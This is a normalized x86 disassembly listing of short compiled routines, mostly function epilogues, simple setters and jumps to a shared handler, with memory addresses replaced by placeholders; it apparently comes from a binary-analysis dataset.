cmp [ eax + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_4790bc
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_4790f8
inc [ eax + 0x3c ]
retn
sub_47941c
jmp sub_4039f4
sub_479423
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479498
jmp sub_4039f4
sub_47949f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47950f
jmp sub_4039f4
sub_479516
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479583
jmp sub_4039f4
sub_47958a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47963f
jmp sub_4039f4
sub_479646
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4796d5
jmp sub_4039f4
sub_4796dc
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_47974f
jmp sub_4039f4
sub_479756
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4797c8
jmp sub_4039f4
sub_4797cf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479844
jmp sub_4039f4
sub_47984b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4039f4#9
jmp sub_4039f4
sub_4798c2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47992f
jmp sub_4039f4
sub_479936
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4039f4#8
jmp sub_4039f4
sub_4799af
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4039f4#7
jmp sub_4039f4
sub_479a2f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
j_sub_4039f4#6
jmp sub_4039f4
sub_479ab3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_479b0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_424808
pop esi
pop ebx
retn
sub_479b20
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
j_sub_4039f4#5
jmp sub_4039f4
sub_479b96
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479c03
jmp sub_4039f4
sub_479c0a
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4039f4#4
jmp sub_4039f4
sub_479c3c
pop ebp
retn
sub_479c40
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4790fc
mov [ rw-data ] eax
sub_479dd0
mov edx 0xafffd5ff
[ esi + 0x4ffadff ]
sub_47a831
jmp sub_4039f4
sub_47a838
pop ecx
pop ebp
retn
sub_47a83c
and eax 0xff
shl eax 0x10
and edx 0xff
or eax edx
retn
sub_47a850
shr eax 0x10
retn
sub_47a854
and eax 0xff
retn
sub_47a85c
xor eax eax
retn
sub_47a9c8
push ebx
mov ebx edx
mov edx ebx
call sub_435f9c
test [ ebx + 0x4 ] 0x30
jne r-xdata
pop ebx
retn
or [ ebx + 0x4 ] 0x10
sub_47a9ec
push ebx
mov ebx eax
mov eax ebx
call sub_443b54
mov eax ebx
call sub_47aa00
pop ebx
retn
sub_47abe2
jmp sub_4039f4
sub_47b13c
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_47b200
call sub_4356b4
retn
sub_47b208
call sub_4356d4
retn
sub_47b238
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47b1a4
test eax eax
setne al
pop esi
pop ebx
retn
sub_47b2f0
cmp dl [ eax + 0x281 ]
je r-xdata
retn
mov [ eax + 0x281 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47b36c
cmp edx [ eax + 0x298 ]
je r-xdata
retn
mov [ eax + 0x298 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47b380
cmp edx [ eax + 0x294 ]
je r-xdata
retn
mov [ eax + 0x294 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
j_sub_4039f4#3
jmp sub_4039f4
sub_47b3c0
pop ebp
retn
sub_47b3c4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_47a7b8
sub_47fee3
cld
pop edx
pop ecx
pop ecx
xor ebx [ ecx - 0x5a ]
iretd
j_sub_4039f4#2
jmp sub_4039f4
sub_481334
pop ebp
retn
j_sub_4039f4
jmp sub_4039f4
sub_4815ad
pop ebp
retn
sub_481606
retn
sub_481607
jmp sub_4039f4
j_sub_481606
jmp sub_481606
sub_48160e
pop ebp
retn
